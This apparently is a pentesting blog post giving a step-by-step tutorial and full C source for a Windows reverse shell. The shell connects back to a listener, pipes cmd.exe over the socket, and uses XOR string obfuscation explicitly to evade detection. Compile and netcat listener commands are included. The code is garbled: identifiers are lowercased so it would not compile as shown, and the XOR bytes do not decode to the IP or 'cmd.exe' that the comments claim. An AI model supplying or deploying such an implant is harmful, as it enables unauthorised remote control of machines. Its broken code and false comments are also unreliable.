---
layout: post
category: pentesting
---

hello, fellow pentesters! today we’ll dive into creating a reverse shell exploit in c for windows. this post will walk you through the steps from setting up a socket connection, using basic obfuscation techniques, and compiling the exploit for x64 systems. this type of exploit could be used in a capture the flag (ctf) competition.

# overview

the objective is to create a reverse shell that connects to a remote server (linux) from a windows client. we’ll utilize windows api functions to set up the socket and initiate the reverse shell.

# steps to build the reverse shell in c

## 1. setting up winsock and creating the socket

first, we initialize winsock, a windows api that provides access to network protocols. this setup allows us to create a socket and prepare it for connection.

```c
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
    socket shell;
    struct sockaddr_in shell_addr;
    wsadata wsa;
    char ip_addr[] = "192.168.37.134"; // target ip
    int port = 443;

    // initialize winsock
    if (wsastartup(makeword(2, 2), &wsa) != 0) {
        printf("[!] winsock initialization failed.\n");
        return 1;
    }

    // create the socket
    shell = wsasocket(af_inet, sock_stream, ipproto_tcp, NULL, 0, 0);
    shell_addr.sin_family = af_inet;
    shell_addr.sin_port = htons(port);
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
    
    // connect to the server
    if (wsaconnect(shell, (sockaddr*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL) == socket_error) {
        printf("[!] connection failed. try again.\n");
        closesocket(shell);
        wsacleanup();
        return 1;
    }
}
```

## 2. adding xor obfuscation

to evade detection, we apply xor obfuscation to the ip and command strings. this approach will make it more difficult for static analysis tools to detect the ip and command directly in the binary.

```c
void xor_decrypt(char *data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

char ip_addr_encrypted[] = "\x6a\x6e\x6f\x61\x72\x39\x37\x4e"; // xor encrypted ip
char cmd_encrypted[] = "\x3e\x2d\x2b\x3e\x21\x2c\x3b\x2e"; // xor encrypted "cmd.exe"
char key = 0xaa;

xor_decrypt(ip_addr_encrypted, strlen(ip_addr_encrypted), key);
xor_decrypt(cmd_encrypted, strlen(cmd_encrypted), key);
```

## 3. running `cmd.exe` over the socket

once connected, we redirect the socket as the standard input/output for a new `cmd.exe` process, effectively creating the reverse shell.

```c
startupinfo si;
process_information pi;
memset(&si, 0, sizeof(si));
si.cb = sizeof(si);
si.dwflags = startf_usestdhandles;
si.hstdinput = si.hstdout = si.hstderr = (handle)shell;

createprocessa(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
waitforsingleobject(pi.hprocess, infinite);
closehandle(pi.hprocess);
closehandle(pi.hthread);
```

## 4. compiling the code for x64

to compile this code for x64 architecture, use the following command with mingw:

```bash
x86_64-w64-mingw32-gcc -o shell_x64.exe shell.c -lws2_32 -static
```

this command will compile a 64-bit binary that includes all necessary libraries statically.

# final code

here’s the complete reverse shell code in c:

```c
#define _winsock_deprecated_no_warnings
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

void xor_decrypt(char *data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    socket shell;
    struct sockaddr_in shell_addr;
    wsadata wsa;
    startupinfo si;
    process_information pi;
    char recvserver[512];
    int connection;
    char ip_addr[] = "\x6a\x6e\x6f\x61\x72\x39\x37\x4e"; // encrypted ip (192.168.37.134)
    char cmd[] = "\x3e\x2d\x2b\x3e\x21\x2c\x3b\x2e"; // encrypted "cmd.exe"
    int port = 443;
    char key = 0xaa;

    xor_decrypt(ip_addr, strlen(ip_addr), key);
    xor_decrypt(cmd, strlen(cmd), key);

    if (wsastartup(makeword(2, 2), &wsa) != 0) {
        printf("[!] winsock initialization failed.\n");
        return 1;
    }

    shell = wsasocket(af_inet, sock_stream, ipproto_tcp, NULL, 0, 0);
    shell_addr.sin_family = af_inet;
    shell_addr.sin_port = htons(port);
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = wsaconnect(shell, (sockaddr*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);

    if (connection == socket_error) {
        printf("[!] connection failed. try again.\n");
        closesocket(shell);
        wsacleanup();
        return 1;
    }

    recv(shell, recvserver, sizeof(recvserver), 0);
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwflags = (startf_usestdhandles | startf_useshowwindow);
    si.hstdinput = si.hstdout = si.hstderr = (handle)shell;

    createprocessa(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    waitforsingleobject(pi.hprocess, infinite);
    closehandle(pi.hprocess);
    closehandle(pi.hthread);

    closesocket(shell);
    wsacleanup();
    return 0;
}
```
# testing the reverse shell

to test the reverse shell, set up a listener on your linux machine with `nc`:

```bash
nc -lvnp 443
```

then execute the compiled `shell_x64.exe` on the windows machine. if successful, you’ll get a shell back on your listener.
